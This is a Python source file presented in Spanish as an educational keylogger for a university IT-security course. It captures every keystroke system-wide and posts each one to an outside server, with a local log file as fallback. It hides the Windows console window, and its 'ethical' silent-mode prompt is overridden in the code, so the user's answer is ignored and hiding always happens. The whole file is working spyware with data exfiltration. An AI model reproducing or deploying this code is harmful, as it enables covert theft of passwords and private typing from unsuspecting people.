#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KeyLogger Educativo - Conversión de C++ a Python
Curso: ITI-724 PRINCIPIOS DE SEGURIDAD DE TI
Universidad Técnica Nacional - Sede del Pacífico
Propósito: Educacional - Análisis de malware y defensa
ADVERTENCIA: Uso únicamente en entornos controlados y con consentimiento
"""

import os
import sys
import time
import datetime
import requests
from pynput import keyboard
from pynput.keyboard import Key

# Configuración de la API
API_URL = "https://apikeylogger.onrender.com/api/teclas"  # Cambiar si usas una URL diferente
API_DISPONIBLE = False

# Configuración del archivo de log (backup)
ARCHIVO_LOG = "KLOG.txt"
RUTA_COMPLETA = os.path.join(os.path.expanduser("~"), "Documents", ARCHIVO_LOG)

# Estado de las teclas modificadoras
shift_presionado = False
caps_lock_activo = False


def obtener_timestamp():
    """Retorna timestamp formateado para los logs"""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def guardar_tecla_pulsada(tecla):
    """
    Función equivalente a guardar_tecla_pulsada() en C++
    Mapea códigos de teclas a representaciones legibles
    Maneja mayúsculas según Shift y Caps Lock
    """
    global shift_presionado, caps_lock_activo
    
    # Mapeo de teclas especiales (equivalente al switch-case de C++)
    teclas_especiales = {
        # Teclas de control (solo las que queremos capturar)
        Key.backspace: "[DEL]",
        Key.tab: "[TAB]",
        Key.enter: "\n",
        Key.esc: "[ESC]",
        Key.space: " ",
        
        # Flechas
        Key.left: "[←]",
        Key.up: "[↑]",
        Key.right: "[→]",
        Key.down: "[↓]",
        
        # Print Screen
        Key.print_screen: "[IMPR_PANT]",
        
        # Teclas de función F1-F12
        Key.f1: "[F1]",
        Key.f2: "[F2]",
        Key.f3: "[F3]",
        Key.f4: "[F4]",
        Key.f5: "[F5]",
        Key.f6: "[F6]",
        Key.f7: "[F7]",
        Key.f8: "[F8]",
        Key.f9: "[F9]",
        Key.f10: "[F10]",
        Key.f11: "[F11]",
        Key.f12: "[F12]",
        
        # Numpad
        Key.num_lock: "[NUM_LOCK]",
        Key.insert: "[INSERT]",
        Key.delete: "[DELETE]",
        Key.home: "[HOME]",
        Key.end: "[END]",
        Key.page_up: "[PAGE_UP]",
        Key.page_down: "[PAGE_DOWN]",
    }
    
    # Caracteres OEM (símbolos especiales)
    oem_chars = {
        '-': "-",
        '.': ".",
        ',': ",",
    }
    
    try:
        # Intentar obtener representación de la tecla
        if isinstance(tecla, Key):
            # Es una tecla especial
            if tecla == Key.shift or tecla == Key.shift_r:
                return None  # No capturar Shift por sí solo
            elif tecla == Key.ctrl or tecla == Key.ctrl_r:
                return None  # No capturar Ctrl por sí solo
            elif tecla == Key.alt or tecla == Key.alt_r:
                return None  # No capturar Alt por sí solo
            elif tecla == Key.caps_lock:
                return None  # No capturar Caps Lock en log, solo actualizar estado
            elif tecla in teclas_especiales:
                return teclas_especiales[tecla]
            else:
                return None  # Ignorar otras teclas especiales desconocidas
        else:
            # Es un carácter alfanumérico
            try:
                char = tecla.char
            except AttributeError:
                return None
            
            if char is None:
                return None
            
            # Mapeo de caracteres OEM
            if char in oem_chars:
                return oem_chars[char]
            
            # Mapeo de números (0x30-0x39)
            if char.isdigit():
                return char
            
            # Mapeo de letras con manejo de mayúsculas
            if char.isalpha():
                # Determinar si debe ser mayúscula
                debe_ser_mayuscula = (shift_presionado or caps_lock_activo) and not (shift_presionado and caps_lock_activo)
                if debe_ser_mayuscula:
                    return char.upper()
                else:
                    return char.lower()
            
            return char
            
    except Exception as e:
        return None


def escribir_en_archivo(contenido):
    """
    Envía teclas a la API o guarda localmente como backup
    """
    global API_DISPONIBLE
    
    try:
        # Intentar enviar a la API
        payload = {"tecla": contenido}
        response = requests.post(API_URL, json=payload, timeout=2)
        
        if response.status_code == 200:
            API_DISPONIBLE = True
        else:
            # Si la API responde con error, guardar localmente
            API_DISPONIBLE = False
            guardar_localmente(contenido)
            
    except requests.exceptions.RequestException:
        # Si no hay conexión con la API, guardar localmente como backup
        API_DISPONIBLE = False
        guardar_localmente(contenido)


def guardar_localmente(contenido):
    """
    Guarda las teclas localmente como backup cuando la API no está disponible
    """
    try:
        os.makedirs(os.path.dirname(RUTA_COMPLETA), exist_ok=True)
        with open(RUTA_COMPLETA, "a", encoding="utf-8") as archivo:
            archivo.write(contenido)
    except Exception as e:
        print(f"Error al guardar en archivo backup: {e}")


def verificar_api():
    """
    Verifica si la API está disponible
    """
    global API_DISPONIBLE
    try:
        response = requests.get("https://apikeylogger.onrender.com/api/status", timeout=2)
        if response.status_code == 200:
            API_DISPONIBLE = True
            return True
    except:
        API_DISPONIBLE = False
    return False


def indetectabilidad():
    """
    Equivalente a FreeConsole() en C++
    En Python, ocultamos la ventana de consola
    """
    if os.name == 'nt':  # Windows
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass


def on_press(tecla):
    """
    Callback cuando se presiona una tecla
    Equivalente al bucle GetAsyncKeyState en C++
    """
    global shift_presionado, caps_lock_activo
    
    try:
        # Actualizar estado de teclas modificadoras
        if tecla == Key.shift or tecla == Key.shift_r:
            shift_presionado = True
            return
        
        if tecla == Key.caps_lock:
            caps_lock_activo = not caps_lock_activo
            return
        
        # Obtener representación de la tecla
        representacion = guardar_tecla_pulsada(tecla)
        
        # Solo procesar si obtuvo una representación válida
        if representacion is not None:
            # Enviar a API
            escribir_en_archivo(representacion)
            
            # Mostrar en consola (para modo debug)
            print(f"Tecla: {representacion.strip()}", end=" | ", flush=True)
        
    except Exception as e:
        print(f"Error procesando tecla: {e}")


def on_release(tecla):
    """
    Callback cuando se suelta una tecla
    Permite detener el keylogger con ESC (mejora sobre C++)
    """
    global shift_presionado
    
    # Actualizar estado de Shift cuando se suelta
    if tecla == Key.shift or tecla == Key.shift_r:
        shift_presionado = False
    
    if tecla == Key.esc:
        print("\n\n[!] Deteniendo KeyLogger (ESC presionado)...")
        return False  # Detener el listener
    return True


def main():
    """
    Función principal - Equivalente a main() en C++
    """
    print("=" * 60)
    print("KEYLOGGER EDUCATIVO - ITI-724 Seguridad de TI")
    print("UTN Sede del Pacífico")
    print("=" * 60)
    print(f"API URL: {API_URL}")
    print(f"Archivo de backup: {RUTA_COMPLETA}")
    print("Presiona ESC para detener")
    print("=" * 60)
    
    # Verificar conexión a la API
    print("\n[*] Verificando conexión con la API...")
    if verificar_api():
        print("[✓] Conectado a la API. Las teclas se enviarán al servidor.")
    else:
        print("[✗] No se pudo conectar a la API.")
        print("[!] Se guardarán las teclas localmente como backup.")
    
    print("")
    
    # Preguntar antes de ocultar consola (ético)
    respuesta = input("¿Deseas ejecutar en modo silencioso? (s/n): ").lower()
    respuesta = "s"
    
    if respuesta == 's':
        indetectabilidad()
        print("Modo silencioso activado...")
    
    print("\n[*] Iniciando captura de teclas...")
    print("[*] El KeyLogger está corriendo...")
    
    # Crear el listener de teclado (equivalente al bucle while+GetAsyncKeyState)
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()
    
    print("[*] KeyLogger detenido.")
    if API_DISPONIBLE:
        print("[*] Teclas enviadas a la API.")
    else:
        print(f"[*] Revisa el archivo de backup: {RUTA_COMPLETA}")


if __name__ == "__main__":
    main()